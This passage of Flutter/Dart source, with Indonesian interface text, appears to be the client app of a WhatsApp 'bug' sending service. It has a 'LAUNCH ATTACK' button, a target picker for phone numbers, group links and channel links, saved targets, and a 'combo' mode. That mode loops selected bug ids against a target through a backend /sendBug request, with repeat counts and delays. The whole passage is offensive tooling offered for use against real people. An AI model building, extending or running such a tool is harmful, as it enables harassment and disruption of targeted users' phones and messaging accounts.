                                      fontFamily: 'ShareTechMono',
                                    ),
                                  ),
                                ],
                              ),
                            ),
                            if (isSelected)
                              Container(
                                padding: const EdgeInsets.all(4),
                                decoration: BoxDecoration(
                                  color: modeColor.withValues(alpha: 0.15),
                                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                  border: Border.all(color: modeColor.withValues(alpha: 0.3)),
                                ),
                                child: Icon(Icons.check, color: modeColor, size: 14),
                              ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            );
          }),
      ],
    );
  }

  Widget _buildLaunchButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        final color = _isSending ? AppTheme.textMuted : AppTheme.gold;
        return Container(
          decoration: BoxDecoration(
            color: color,
            borderRadius: BorderRadius.circular(AppTheme.radiusM),
            boxShadow: _isSending
                ? []
                : [
                    BoxShadow(
                      color: AppTheme.gold.withValues(alpha: 0.3 + _pulseController.value * 0.2),
                      blurRadius: 20 + _pulseController.value * 10,
                      spreadRadius: -2,
                    ),
                  ],
          ),
          child: SizedBox(
            width: double.infinity,
            height: 56,
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                borderRadius: BorderRadius.circular(AppTheme.radiusM),
                onTap: _isSending ? null : _sendBug,
                child: Center(
                  child: _isSending
                      ? Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            SizedBox(height: 22, width: 22, child: CircularProgressIndicator(color: AppTheme.bgDeep.withValues(alpha: 0.5), strokeWidth: 3)),
                            const SizedBox(width: 12),
                            Text("PROCESSING...", style: TextStyle(color: AppTheme.bgDeep.withValues(alpha: 0.5), fontWeight: FontWeight.w800, fontSize: 13, letterSpacing: 2)),
                          ],
                        )
                      : const Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.rocket_launch_rounded, color: AppTheme.bgDeep, size: 22),
                            SizedBox(width: 12),
                            Text("LAUNCH ATTACK", style: TextStyle(color: AppTheme.bgDeep, fontWeight: FontWeight.w800, fontSize: 14, letterSpacing: 2.5)),
                          ],
                        ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildHistoryWidget() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Text("RIWAYAT PENGIRIMAN", style: AppTheme.label),
            GestureDetector(
              onTap: _fetchHistory,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: AppTheme.sky.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: AppTheme.sky.withValues(alpha: 0.3)),
                ),
                child: const Text("REFRESH", style: TextStyle(color: AppTheme.sky, fontSize: 8, fontWeight: FontWeight.w800, letterSpacing: 0.5)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        Container(
          decoration: AppTheme.cardDecor(),
          child: _isLoadingHistory
              ? const Padding(
                  padding: EdgeInsets.all(32.0),
                  child: Center(child: CircularProgressIndicator(color: AppTheme.gold, strokeWidth: 3)),
                )
              : _history.isEmpty
                  ? Padding(
                      padding: const EdgeInsets.all(24.0),
                      child: Center(
                        child: Column(
                          children: [
                            const Icon(Icons.history_rounded, color: AppTheme.textMuted, size: 48),
                            const SizedBox(height: 8),
                            Text("Belum ada riwayat", style: AppTheme.bodyM),
                          ],
                        ),
                      ),
                    )
                  : ListView.separated(
                      shrinkWrap: true,
                      physics: const NeverScrollableScrollPhysics(),
                      itemCount: _history.length > 10 ? 10 : _history.length,
                      separatorBuilder: (_, __) => const Divider(color: AppTheme.borderSubtle, thickness: 1, height: 1),
                      itemBuilder: (context, index) {
                        final item = _history[index];
                        final isSuccess = item['success'] ?? false;
                        final statusColor = isSuccess ? AppTheme.mint : AppTheme.coral;
                        final time = DateTime.tryParse(item['time'] ?? '');
                        final timeStr = time != null
                            ? "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}"
                            : '--:--';
                        return Container(
                          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                          color: index.isEven ? AppTheme.bgCard : AppTheme.bgSurface,
                          child: Row(
                            children: [
                              Container(width: 6, height: 6, decoration: BoxDecoration(color: statusColor, shape: BoxShape.circle, boxShadow: AppTheme.softGlow(statusColor, blur: 6, opacity: 0.3))),
                              const SizedBox(width: 10),
                              Expanded(
                                flex: 3,
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(item['target'] ?? 'Unknown', style: AppTheme.bodyM.copyWith(color: AppTheme.textPrimary, fontWeight: FontWeight.w700), maxLines: 1, overflow: TextOverflow.ellipsis),
                                    const SizedBox(height: 2),
                                    Text(item['bug_id'] ?? 'Unknown Bug', style: AppTheme.caption),
                                  ],
                                ),
                              ),
                              const SizedBox(width: 8),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                decoration: BoxDecoration(
                                  color: statusColor.withValues(alpha: 0.15),
                                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                  border: Border.all(color: statusColor.withValues(alpha: 0.3)),
                                ),
                                child: Text(item['status'] ?? 'Unknown', style: TextStyle(color: statusColor, fontSize: 8, fontWeight: FontWeight.w800)),
                              ),
                              const SizedBox(width: 8),
                              Text(timeStr, style: AppTheme.caption),
                            ],
                          ),
                        );
                      },
                    ),
        ),
        if (_selectedBugMode == "number" && _savedTargets.isNotEmpty) ...[
          const SizedBox(height: 10),
          Row(
            children: [
              const Icon(Icons.bookmark_outline_rounded, color: AppTheme.textMuted, size: 14),
              const SizedBox(width: 4),
              Text("SAVED (${_savedTargets.length}/$_maxSavedTargets)", style: AppTheme.label.copyWith(fontSize: 10)),
            ],
          ),
          const SizedBox(height: 6),
          Wrap(
            spacing: 6,
            runSpacing: 6,
            children: List.generate(_savedTargets.length, (i) {
              return GestureDetector(
                onTap: () {
                  setState(() => targetController.text = _savedTargets[i]);
                },
                onLongPress: () {
                  showDialog(
                    context: context,
                    builder: (ctx) => AlertDialog(
                      backgroundColor: AppTheme.bgCard,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(AppTheme.radiusM),
                        side: const BorderSide(color: AppTheme.borderSubtle, width: 1),
                      ),
                      title: Text("Hapus Target?", style: AppTheme.headingM),
                      content: Text(_savedTargets[i], style: AppTheme.bodyL),
                      actions: [
                        TextButton(onPressed: () => Navigator.pop(ctx), child: const Text("Batal", style: TextStyle(color: AppTheme.textMuted))),
                        TextButton(
                          onPressed: () { _removeTarget(i); Navigator.pop(ctx); },
                          child: const Text("Hapus", style: TextStyle(color: AppTheme.coral, fontWeight: FontWeight.w700)),
                        ),
                      ],
                    ),
                  );
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                  decoration: BoxDecoration(
                    color: AppTheme.lavender.withValues(alpha: 0.1),
                    borderRadius: BorderRadius.circular(AppTheme.radiusS),
                    border: Border.all(color: AppTheme.lavender.withValues(alpha: 0.2)),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.phone_rounded, color: AppTheme.sky, size: 12),
                      const SizedBox(width: 4),
                      Text(
                        _savedTargets[i].length > 15 ? "${_savedTargets[i].substring(0, 15)}..." : _savedTargets[i],
                        style: const TextStyle(color: AppTheme.textSecondary, fontSize: 11, fontWeight: FontWeight.w700),
                      ),
                    ],
                  ),
                ),
              );
            }),
          ),
        ],
      ],
    );
  }

  Widget _buildFooterInfo() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: AppTheme.cardDecor(),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(4),
            decoration: BoxDecoration(
              color: AppTheme.bgCard,
              borderRadius: BorderRadius.circular(AppTheme.radiusS),
              boxShadow: AppTheme.softGlow(AppTheme.gold, blur: 6, opacity: 0.1),
            ),
            child: const Icon(Icons.key_rounded, color: AppTheme.gold, size: 12),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              "Session: ${widget.expiredDate}  \u2022  P($_privateSenderCount)  G($_globalSenderCount)",
              style: AppTheme.caption,
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: AppTheme.mint.withValues(alpha: 0.15),
              borderRadius: BorderRadius.circular(AppTheme.radiusS),
              border: Border.all(color: AppTheme.mint.withValues(alpha: 0.3)),
            ),
            child: const Text("ONLINE", style: TextStyle(color: AppTheme.mint, fontSize: 8, fontWeight: FontWeight.w800, letterSpacing: 0.3)),
          ),
        ],
      ),
    );
  }

  void _showSenderSelectionPopup() {
    if (widget.role != 'developer' && widget.role != 'all_akses' && widget.role != 'owner' && widget.role != 'vip') {
      _showAlert("Akses Terbatas", "Mode pengirim global hanya untuk Owner/VIP.");
      return;
    }
    setState(() {});
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => StatefulBuilder(
        builder: (context, setStateBottomSheet) {
          return Container(
            margin: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppTheme.bgCard,
              borderRadius: BorderRadius.circular(AppTheme.radiusL),
              border: Border.all(color: AppTheme.borderSubtle, width: 1),
              boxShadow: AppTheme.elevatedShadow,
            ),
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: AppTheme.borderMedium, borderRadius: BorderRadius.circular(2)))),
                const SizedBox(height: 16),
                Center(child: Text("PILIH SENDER", style: AppTheme.headingM.copyWith(letterSpacing: 2))),
                const SizedBox(height: 20),
                const Divider(color: AppTheme.borderSubtle, thickness: 1),
                const SizedBox(height: 12),
                _buildSenderOption(
                  context: context,
                  setStateBS: setStateBottomSheet,
                  mode: "private",
                  icon: Icons.lock_outline,
                  title: "PRIVATE",
                  isActive: _isPrivateActive,
                  count: _privateSenderCount,
                ),
                const SizedBox(height: 10),
                _buildSenderOption(
                  context: context,
                  setStateBS: setStateBottomSheet,
                  mode: "global",
                  icon: Icons.public,
                  title: "GLOBAL",
                  isActive: _globalSenderCount > 0,
                  count: _globalSenderCount,
                ),
                const SizedBox(height: 16),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildSenderOption({required BuildContext context, required StateSetter setStateBS, required String mode, required IconData icon, required String title, required bool isActive, required int count}) {
    final selected = _senderMode == mode;
    final statusColor = isActive ? AppTheme.mint : AppTheme.coral;
    return GestureDetector(
      onTap: () {
        setStateBS(() { _senderMode = mode; });
        setState(() {});
        Navigator.pop(context);
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: selected ? AppTheme.accentCardDecor(AppTheme.gold) : AppTheme.cardDecor(),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: AppTheme.bgCard,
                    borderRadius: BorderRadius.circular(AppTheme.radiusS),
                    boxShadow: AppTheme.softGlow(statusColor, blur: 6, opacity: 0.1),
                  ),
                  child: Icon(icon, color: statusColor, size: 18),
                ),
                const SizedBox(width: 14),
                Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, style: AppTheme.headingM),
                    const SizedBox(height: 3),
                    Row(
                      children: [
                        Container(width: 8, height: 8, decoration: BoxDecoration(color: statusColor, shape: BoxShape.circle, boxShadow: AppTheme.softGlow(statusColor, blur: 6, opacity: 0.3))),
                        const SizedBox(width: 6),
                        Text("${isActive ? 'Active' : 'Inactive'} \u2022 $count Sender", style: AppTheme.caption),
                      ],
                    ),
                  ],
                ),
              ],
            ),
            if (selected)
              Container(
                padding: const EdgeInsets.all(4),
                decoration: BoxDecoration(
                  color: AppTheme.gold.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: AppTheme.gold.withValues(alpha: 0.3)),
                ),
                child: const Icon(Icons.check, color: AppTheme.gold, size: 16),
              ),
          ],
        ),
      ),
    );
  }

  void _showCountryCodePicker() {
    final searchCtrl = TextEditingController();
    List<Map<String, String>> filtered = List.from(_countryCodes.where((c) => c['name'] != 'Indonesia' || c['code'] == '+62').toList());

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setBS) {
          return Container(
            height: MediaQuery.of(context).size.height * 0.7,
            margin: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppTheme.bgCard,
              borderRadius: BorderRadius.circular(AppTheme.radiusL),
              border: Border.all(color: AppTheme.borderSubtle, width: 1),
              boxShadow: AppTheme.elevatedShadow,
            ),
            child: Column(
              children: [
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: AppTheme.bgSurface,
                    borderRadius: const BorderRadius.vertical(top: Radius.circular(AppTheme.radiusL)),
                  ),
                  child: Text("PILIH KODE NEGARA", style: AppTheme.headingM.copyWith(color: AppTheme.gold, letterSpacing: 2)),
                ),
                const SizedBox(height: 12),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  child: TextField(
                    controller: searchCtrl,
                    style: const TextStyle(color: AppTheme.textPrimary, fontSize: 14),
                    cursorColor: AppTheme.sky,
                    onChanged: (v) {
                      setBS(() {
                        final q = v.toLowerCase();
                        filtered = _countryCodes.where((c) =>
                          c['name']!.toLowerCase().contains(q) ||
                          c['code']!.contains(q)
                        ).toList();
                      });
                    },
                    decoration: InputDecoration(
                      hintText: "Cari negara...",
                      hintStyle: const TextStyle(color: AppTheme.textMuted, fontSize: 13),
                      prefixIcon: const Icon(Icons.search_rounded, color: AppTheme.textMuted, size: 20),
                      filled: true,
                      fillColor: AppTheme.bgInput,
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(AppTheme.radiusM),
                        borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(AppTheme.radiusM),
                        borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(AppTheme.radiusM),
                        borderSide: const BorderSide(color: AppTheme.sky, width: 2),
                      ),
                      contentPadding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.builder(
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    itemCount: filtered.length,
                    itemBuilder: (ctx, i) {
                      final c = filtered[i];
                      final isSelected = c['code'] == _selectedCountryCode;
                      return GestureDetector(
                        onTap: () {
                          setState(() {
                            _selectedCountryCode = c['code']!;
                            _selectedCountryFlag = c['flag']!;
                          });
                          Navigator.pop(ctx);
                        },
                        child: Container(
                          margin: const EdgeInsets.only(bottom: 4),
                          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                          decoration: isSelected
                              ? AppTheme.accentCardDecor(AppTheme.gold)
                              : null,
                          child: Row(
                            children: [
                              Text(c['flag']!, style: const TextStyle(fontSize: 24)),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(c['name']!, style: TextStyle(color: AppTheme.textPrimary, fontSize: 14, fontWeight: isSelected ? FontWeight.w800 : FontWeight.w600)),
                                    Text(c['code']!, style: AppTheme.caption),
                                  ],
                                ),
                              ),
                              if (isSelected) Icon(Icons.check_circle_rounded, color: AppTheme.mint, size: 20),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildCustomPayloadSection() {
    final availableBugs = _getFilteredBugs();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: [
            _sectionLabel("COMBO BUGS", AppTheme.lavender),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
              decoration: BoxDecoration(
                color: AppTheme.lavender.withValues(alpha: 0.15),
                borderRadius: BorderRadius.circular(AppTheme.radiusS),
                border: Border.all(color: AppTheme.lavender.withValues(alpha: 0.3)),
              ),
              child: Text(
                "${_customBugIds.length} selected",
                style: const TextStyle(color: AppTheme.lavender, fontSize: 8, fontWeight: FontWeight.w800, letterSpacing: 1),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),

        if (availableBugs.isEmpty)
          Container(
            padding: const EdgeInsets.all(20),
            decoration: AppTheme.cardDecor(),
            child: Center(
              child: Text(
                "No bugs available for this mode",
                style: AppTheme.bodyM,
              ),
            ),
          )
        else
          ...availableBugs.map((bug) {
            final isSelected = _customBugIds.contains(bug['bug_id']);
            return Padding(
              padding: const EdgeInsets.only(bottom: 6),
              child: GestureDetector(
                onTap: () {
                  setState(() {
                    if (isSelected) {
                      _customBugIds.remove(bug['bug_id']);
                    } else {
                      _customBugIds.add(bug['bug_id']);
                    }
                  });
                },
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                  decoration: isSelected
                      ? AppTheme.accentCardDecor(AppTheme.lavender)
                      : AppTheme.cardDecor(),
                  child: Row(
                    children: [
                      Container(
                        width: 22,
                        height: 22,
                        decoration: BoxDecoration(
                          color: isSelected ? AppTheme.lavender.withValues(alpha: 0.2) : AppTheme.bgCard,
                          borderRadius: BorderRadius.circular(6),
                          border: Border.all(color: isSelected ? AppTheme.lavender : AppTheme.borderSubtle, width: 1.5),
                        ),
                        child: isSelected
                            ? const Icon(Icons.check, color: AppTheme.lavender, size: 14)
                            : null,
                      ),
                      const SizedBox(width: 12),
                      Container(
                        padding: const EdgeInsets.all(5),
                        decoration: BoxDecoration(
                          color: isSelected ? AppTheme.lavender.withValues(alpha: 0.2) : AppTheme.bgCard,
                          borderRadius: BorderRadius.circular(AppTheme.radiusS),
                          boxShadow: isSelected ? AppTheme.softGlow(AppTheme.lavender, blur: 6, opacity: 0.1) : [],
                        ),
                        child: Icon(
                          Icons.extension_rounded,
                          color: isSelected ? AppTheme.lavender : AppTheme.textMuted,
                          size: 14,
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              bug['bug_name'] ?? "Unknown",
                              style: TextStyle(
                                color: isSelected ? AppTheme.textPrimary : AppTheme.textSecondary,
                                fontSize: 12,
                                fontWeight: FontWeight.w800,
                              ),
                            ),
                            Text(
                              bug['bug_id'] ?? "",
                              style: TextStyle(
                                color: isSelected ? AppTheme.textSecondary : AppTheme.textMuted,
                                fontSize: 8,
                                fontWeight: FontWeight.w600,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ],
                        ),
                      ),
                      if (isSelected)
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            color: AppTheme.gold.withValues(alpha: 0.15),
                            borderRadius: BorderRadius.circular(4),
                            border: Border.all(color: AppTheme.gold.withValues(alpha: 0.3)),
                          ),
                          child: Text(
                            "#${_customBugIds.indexOf(bug['bug_id']) + 1}",
                            style: const TextStyle(color: AppTheme.gold, fontSize: 9, fontWeight: FontWeight.w800),
                          ),
                        ),
                    ],
                  ),
                ),
              ),
            );
          }),

        const SizedBox(height: 16),

        _sectionLabel("LOOP & SLEEP", AppTheme.peach),
        const SizedBox(height: 8),

        Row(
          children: [
            Expanded(
              child: Container(
                padding: const EdgeInsets.all(12),
                decoration: AppTheme.cardDecor(),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(4),
                          decoration: BoxDecoration(
                            color: AppTheme.mint.withValues(alpha: 0.15),
                            borderRadius: BorderRadius.circular(AppTheme.radiusS),
                            border: Border.all(color: AppTheme.mint.withValues(alpha: 0.3)),
                          ),
                          child: const Icon(Icons.repeat_rounded, color: AppTheme.mint, size: 14),
                        ),
                        const SizedBox(width: 8),
                        Text("LOOP", style: AppTheme.label.copyWith(fontSize: 9)),
                      ],
                    ),
                    const SizedBox(height: 8),
                    Row(
                      children: [
                        _buildSmallButton(Icons.remove, () {
                          if (_customLoop > 1) {
                            setState(() => _customLoop--);
                            _loopController.text = _customLoop.toString();
                          }
                        }),
                        Expanded(
                          child: TextField(
                            controller: _loopController,
                            textAlign: TextAlign.center,
                            keyboardType: TextInputType.number,
                            style: const TextStyle(color: AppTheme.textPrimary, fontSize: 18, fontWeight: FontWeight.w800),
                            cursorColor: AppTheme.mint,
                            onChanged: (v) {
                              final n = int.tryParse(v);
                              if (n != null && n >= 1 && n <= 100) {
                                setState(() => _customLoop = n);
                              }
                            },
                            decoration: InputDecoration(
                              isDense: true,
                              contentPadding: const EdgeInsets.symmetric(vertical: 8),
                              border: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1)),
                              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1)),
                              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.mint, width: 2)),
                            ),
                          ),
                        ),
                        _buildSmallButton(Icons.add, () {
                          if (_customLoop < 100) {
                            setState(() => _customLoop++);
                            _loopController.text = _customLoop.toString();
                          }
                        }),
                      ],
                    ),
                    const SizedBox(height: 6),
                    Center(
                      child: Text("Repeat ${_customLoop}x", style: AppTheme.caption),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Container(
                padding: const EdgeInsets.all(12),
                decoration: AppTheme.cardDecor(),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(4),
                          decoration: BoxDecoration(
                            color: AppTheme.peach.withValues(alpha: 0.15),
                            borderRadius: BorderRadius.circular(AppTheme.radiusS),
                            border: Border.all(color: AppTheme.peach.withValues(alpha: 0.3)),
                          ),
                          child: Icon(Icons.timer_outlined, color: AppTheme.peach, size: 14),
                        ),
                        const SizedBox(width: 8),
                        Text("SLEEP", style: AppTheme.label.copyWith(fontSize: 9)),
                      ],
                    ),
                    const SizedBox(height: 8),
                    Row(
                      children: [
                        _buildSmallButton(Icons.remove, () {
                          if (_customSleep > 0) {
                            setState(() => _customSleep--);
                            _sleepController.text = _customSleep.toString();
                          }
                        }),
                        Expanded(
                          child: TextField(
                            controller: _sleepController,
                            textAlign: TextAlign.center,
                            keyboardType: TextInputType.number,
                            style: const TextStyle(color: AppTheme.textPrimary, fontSize: 18, fontWeight: FontWeight.w800),
                            cursorColor: AppTheme.peach,
                            onChanged: (v) {
                              final n = int.tryParse(v);
                              if (n != null && n >= 0 && n <= 60) {
                                setState(() => _customSleep = n);
                              }
                            },
                            decoration: InputDecoration(
                              isDense: true,
                              contentPadding: const EdgeInsets.symmetric(vertical: 8),
                              border: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1)),
                              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.borderSubtle, width: 1)),
                              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(AppTheme.radiusS), borderSide: const BorderSide(color: AppTheme.peach, width: 2)),
                            ),
                          ),
                        ),
                        _buildSmallButton(Icons.add, () {
                          if (_customSleep < 60) {
                            setState(() => _customSleep++);
                            _sleepController.text = _customSleep.toString();
                          }
                        }),
                      ],
                    ),
                    const SizedBox(height: 6),
                    Center(
                      child: Text("$_customSleep sec delay", style: AppTheme.caption),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),

        const SizedBox(height: 12),

        if (_customBugIds.isNotEmpty)
          Container(
            padding: const EdgeInsets.all(12),
            decoration: AppTheme.accentCardDecor(AppTheme.lavender),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: AppTheme.lavender.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(AppTheme.radiusS),
                    border: Border.all(color: AppTheme.lavender.withValues(alpha: 0.3)),
                  ),
                  child: const Icon(Icons.info_outline_rounded, color: AppTheme.lavender, size: 16),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Combo: ${_customBugIds.length} bugs x ${_customLoop} loops",
                        style: AppTheme.bodyM.copyWith(color: AppTheme.textPrimary, fontWeight: FontWeight.w800),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        "Total: ${_customBugIds.length * _customLoop} attacks | Sleep: ${_customSleep}s between each",
                        style: AppTheme.caption,
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
      ],
    );
  }

  Widget _buildSmallButton(IconData icon, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(6),
        decoration: BoxDecoration(
          color: AppTheme.bgCard,
          borderRadius: BorderRadius.circular(AppTheme.radiusS),
          border: Border.all(color: AppTheme.borderSubtle, width: 1),
        ),
        child: Icon(icon, color: AppTheme.textPrimary, size: 16),
      ),
    );
  }

  Future<void> _sendCustomPayload() async {
    var rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final numberOnly = targetController.text.trim();
      if (numberOnly.isEmpty || key.isEmpty) {
        _showAlert("Invalid Number", "Masukkan nomor telepon.");
        return;
      }
      rawInput = "$_selectedCountryCode$numberOnly";
    } else if (_selectedBugMode == "channel") {
      if (!isValidChannelLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link channel WA yang valid.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid.");
        return;
      }
    }

    if (_customBugIds.isEmpty) {
      _showAlert("No Bugs Selected", "Pilih minimal 1 bug untuk combo.");
      return;
    }

    setState(() => _isSending = true);

    int successCount = 0;
    int failCount = 0;

    for (int loop = 0; loop < _customLoop; loop++) {
      for (int i = 0; i < _customBugIds.length; i++) {
        if (!mounted) return;
        final bugId = _customBugIds[i];
        try {
          final res = await http.get(Uri.parse(
              "${ApiConfig.baseUrl}/sendBug?key=$key&target=$rawInput&bug=$bugId&senderMode=$_senderMode"));
          final data = jsonDecode(res.body);
          if (data["sended"] == true) { successCount++; } else { failCount++; }
        } catch (_) { failCount++; }
        if (i < _customBugIds.length - 1 && _customSleep > 0) {
          await Future.delayed(Duration(seconds: _customSleep));
        }
      }
      if (loop < _customLoop - 1 && _customSleep > 0) {
        await Future.delayed(Duration(seconds: _customSleep));
      }
    }

    if (!mounted) return;
    setState(() => _isSending = false);
    _addToHistory(rawInput, "COMBO(${_customBugIds.length} bugs)", "Done: $successCount OK / $failCount Fail", successCount > 0);
    _showAlert("Combo Complete", "Berhasil: $successCount\nGagal: $failCount\nTotal: ${successCount + failCount} attacks");
    _fetchSenderStats();
  }

  final PageController _menuPageController = PageController(viewportFraction: 0.88);
  int _currentMenuPage = 0;

  Widget _buildMainMenu() {
    final menuData = [
      {
        "icon": Icons.person_rounded,
        "title": "BUG NOMOR",
        "subtitle": "Kirim bug ke nomor personal / individual target",
        "color": AppTheme.sky,
        "count": "${_getFilteredBugsForMode('number').length} bugs",
        "mode": "number",
      },
      {
        "icon": Icons.group_rounded,
        "title": "BUG GROUP",
        "subtitle": "Kirim bug ke link grup WhatsApp / group target",
        "color": AppTheme.coral,
        "count": "${_getFilteredBugsForMode('group').length} bugs",
        "mode": "group",
      },
      {
        "icon": Icons.campaign_rounded,
        "title": "BUG CHANNEL",
        "subtitle": "Kirim bug ke link channel WhatsApp / channel target",
        "color": AppTheme.mint,
        "count": "${_getFilteredBugsForMode('channel').length} bugs",
        "mode": "channel",
      },
      {
        "icon": Icons.extension_rounded,
        "title": "CUSTOM PAYLOAD",
        "subtitle": "Combo multiple bugs + loop & sleep settings",
        "color": AppTheme.lavender,
        "count": "Advanced",
        "mode": "custom",
      },
    ];

    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const SizedBox(height: 4),
        _buildTopAppBar(),
        const SizedBox(height: 16),
        _buildTopHeader(),
        const SizedBox(height: 16),
        _buildStatsWidget(),
        const SizedBox(height: 20),

        _sectionLabel("SELECT MODE", AppTheme.mint),

        Padding(
          padding: const EdgeInsets.only(left: 16, bottom: 12),
          child: Text(
            "← Swipe to see menus →",
            style: AppTheme.caption.copyWith(fontSize: 10),
          ),
        ),

        SizedBox(
          height: 260,
          child: PageView.builder(
            controller: _menuPageController,
            itemCount: menuData.length,
            onPageChanged: (index) {
              setState(() => _currentMenuPage = index);
            },
            itemBuilder: (context, index) {
              final menu = menuData[index];
              final Color color = menu['color'] as Color;
              final bool isActive = _currentMenuPage == index;

              return AnimatedScale(
                scale: isActive ? 1.0 : 0.92,
                duration: const Duration(milliseconds: 300),
                child: GestureDetector(
                  onTap: () {
                    setState(() {
                      _selectedMenu = menu['mode'] as String;
                      _selectedBugMode = menu['mode'] == "custom" ? "number" : menu['mode'] as String;
                    });
                  },
